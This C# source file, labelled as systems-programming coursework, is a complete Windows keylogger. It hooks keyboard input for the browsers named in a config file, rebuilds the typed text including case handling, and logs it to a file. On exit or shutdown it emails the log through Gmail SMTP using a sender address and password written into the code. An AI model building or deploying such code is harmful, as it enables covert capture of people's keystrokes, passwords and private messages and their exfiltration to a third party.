using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Management;
using System.Windows.Input;
using System.Collections.Generic;
using System.Threading;
using System.Text;
using System.IO;
using Microsoft.Win32;
using System.Net.Mail;

class Coursework_SysProgramming
{
    #region Variables
    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
    private const int WH_KEYBOARD_LL = 13;
    private const int WH_KEYBOARD = 2;
    private const int WM_KEYDOWN = 256;
    private static IntPtr hook = IntPtr.Zero;
    private static string[] browserNames;
    private static List<IntPtr> hooks;
    private static int counter = 0;
    private static bool isShift = false;
    private static bool isCapsLock = false;
    private static StringBuilder content;
    private static bool canWrite = false;
    private static System.Threading.Timer timer;
    private static string fileName;
    #endregion

    #region Extern
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
                                                  HookProc lpfn,
                                                  IntPtr hMod,
                                                  uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk,
                                                int nCode,
                                                IntPtr wParam,
                                                IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern IntPtr GetFocus();

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern IntPtr GetForegroundWindow();

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


    #endregion

    #region Page Event Setup
    enum ConsoleCtrlHandlerCode : uint
    {
        CTRL_C_EVENT = 0,
        CTRL_BREAK_EVENT = 1,
        CTRL_CLOSE_EVENT = 2,
        CTRL_LOGOFF_EVENT = 5,
        CTRL_SHUTDOWN_EVENT = 6
    }
    delegate bool ConsoleCtrlHandlerDelegate(ConsoleCtrlHandlerCode eventCode);
    [DllImport("kernel32.dll")]
    static extern bool SetConsoleCtrlHandler(ConsoleCtrlHandlerDelegate handlerProc, bool add);
    static ConsoleCtrlHandlerDelegate _consoleHandler;
    #endregion

    #region Page Events
    static bool ConsoleEventHandler(ConsoleCtrlHandlerCode eventCode)
    {
        switch (eventCode)
        {
            case ConsoleCtrlHandlerCode.CTRL_CLOSE_EVENT:
            case ConsoleCtrlHandlerCode.CTRL_BREAK_EVENT:
            case ConsoleCtrlHandlerCode.CTRL_LOGOFF_EVENT:
            case ConsoleCtrlHandlerCode.CTRL_SHUTDOWN_EVENT:
                Application_ApplicationExit(null, null);
                SendEmailMessage();
                Application.Exit();
                break;
        }

        return (false);
    }
    #endregion

    #region Methods
    public static void Main()
    {
        try
        {
            fileName = "result_" + DateTime.Now.ToShortDateString() + " " + DateTime.Now.ToShortTimeString(); 
            fileName = fileName.Replace(':', '_');
            fileName = fileName.Replace('.', '_');
            fileName += ".txt";

            _consoleHandler = new ConsoleCtrlHandlerDelegate(ConsoleEventHandler);
            SetConsoleCtrlHandler(_consoleHandler, true);

            content = new StringBuilder();
            System.IO.File.Create(fileName).Close();
            browserNames = GetBrowserNames();
            SetHooks();
            timer = new System.Threading.Timer(
                new TimerCallback(
                    delegate(object obj)
                    {
                        SetHooks();
                    }
                )
                );
            timer.Change(int.MaxValue, 5);

            Application.Run();
        }
        catch (NullReferenceException e)
        {
            Console.WriteLine(e.Message);
        }
    }

    private static void Application_ApplicationExit(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        builder.AppendLine("");
        builder.AppendLine(string.Format("Time end: {0} {1}", DateTime.Now.ToShortDateString(), DateTime.Now.ToLongTimeString()));
        builder.AppendLine("--------------------------------------------------------------\n");

        System.IO.FileStream stream = System.IO.File.Open(fileName, System.IO.FileMode.Append);

        stream.Write(Encoding.Default.GetBytes(builder.ToString()), 0, Encoding.Default.GetByteCount(builder.ToString().ToCharArray()));
        stream.Close();
    }

    private static void SetHooks()
    {
        HookProc proc = new HookProc(HookCallback);
        hooks = new List<IntPtr>();
        try
        {
            StringBuilder builder = new StringBuilder();
            builder.AppendLine("--------------------------------------------------------------\n");
            builder.Append("Browser names: ");
            for (int i = 0; i < browserNames.Length; i++)
            {
                if (i != browserNames.Length - 1)
                {
                   builder.Append(browserNames[i] + ", ");
                }
                else
                {
                    builder.AppendLine(browserNames[i]);
                }

                try
                {
                    Process process = Process.GetProcessesByName(browserNames[i])[0];
                    ProcessModule curModule = process.MainModule;
                    hooks.Add(SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0));
                }
                catch
                {

                }
            }


            builder.AppendLine(string.Format("Time start: {0} {1}", DateTime.Now.ToShortDateString(), DateTime.Now.ToLongTimeString()));
            builder.Append("Content: ");
            Console.WriteLine(builder.ToString());

            System.IO.FileStream stream = System.IO.File.Open(fileName, System.IO.FileMode.Append);

            canWrite = false;
            stream.BeginWrite(Encoding.Default.GetBytes(builder.ToString()), 0, Encoding.Default.GetByteCount(builder.ToString().ToCharArray()), new AsyncCallback(delegate(IAsyncResult res)
                {
                    stream.EndWrite(res);
                    stream.Close();
                    canWrite = true;
                }), null);
        }
        catch (Exception e)
        {
            Console.WriteLine(e.Message);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (counter > 0)
        {
            counter--;
        }
        else
        {
            counter = hooks.Count - 1;
            if ((nCode >= 0) && (wParam == (IntPtr)WM_KEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                KeysConverter kc = new KeysConverter();
                string keyChar = kc.ConvertToInvariantString(vkCode);

                if ((Keys)vkCode == Keys.Shift)
                {
                    isShift = true;
                }
                if ((Keys)vkCode == Keys.Back)
                {
                    content = content.Remove(content.Length - 1, 1);
                }
                if ((Keys)vkCode == Keys.Enter)
                {
                    content = content.AppendLine();
                }
                if ((Keys)vkCode == Keys.CapsLock)
                {
                    if (isCapsLock == true)
                    {
                        isCapsLock = false;
                    }
                    else
                    {
                        isCapsLock = true;
                    }
                }
                if ((Keys)vkCode == Keys.Space)
                {
                    content = content.Append(' ');
                }
                else
                {

                    if (!isShift && !isCapsLock)
                    {
                        content = content.Append(char.ToLower(keyChar[0]));
                    }
                    else
                        if (isCapsLock && isShift)
                        {
                            content = content.Append(char.ToLower(keyChar[0]));
                            isShift = false;
                        }
                        else
                        {
                            content = content.Append(keyChar[0]);
                            isShift = false;
                        }
                }
                if (canWrite)
                {
                    canWrite = false;
                    System.IO.FileStream stream = System.IO.File.Open(fileName, System.IO.FileMode.Append);

                    stream.BeginWrite(Encoding.Default.GetBytes(content.ToString()), 0, Encoding.Default.GetByteCount(content.ToString().ToCharArray()), new AsyncCallback(delegate(IAsyncResult res)
                    {
                        stream.EndWrite(res);
                        stream.Close();
                        content.Clear();
                        canWrite = true;
                    }), null);
                }
                Console.Write(content.ToString());
                content.Clear();
            }
        }

        return CallNextHookEx(hook, nCode, wParam, lParam);
    }

    private static string[] GetBrowserNames()
    {
        List<string> browserNames = new List<string>();
        try
        {
            string fileContent = System.IO.File.ReadAllText("config.txt");
            fileContent = fileContent.Replace(",", "");
            System.Text.StringBuilder builder = new System.Text.StringBuilder();
            for (int i = 0; i < fileContent.Length; i++)
            {
                if (fileContent[i] == ' ')
                {
                    browserNames.Add(builder.ToString());
                    builder.Clear();
                }
                else
                {
                    builder.Append(fileContent[i]);
                }
            }
        }
        catch(Exception e)
        {
            Console.WriteLine(e.Message);
        }
        return browserNames.ToArray();
    }

    private static void SendEmailMessage()
    {
        MailMessage Message = new MailMessage("testingsystemvova@gmail.com", "2411vova@gmail.com", "123", File.ReadAllText(fileName));
        SmtpClient client = new SmtpClient("smtp.gmail.com");
        client.Port = 587;
        client.Credentials = new System.Net.NetworkCredential("testingsystemvova@gmail.com", "vova2411");
        client.EnableSsl = true;
        client.Send(Message);
    }
    #endregion
}
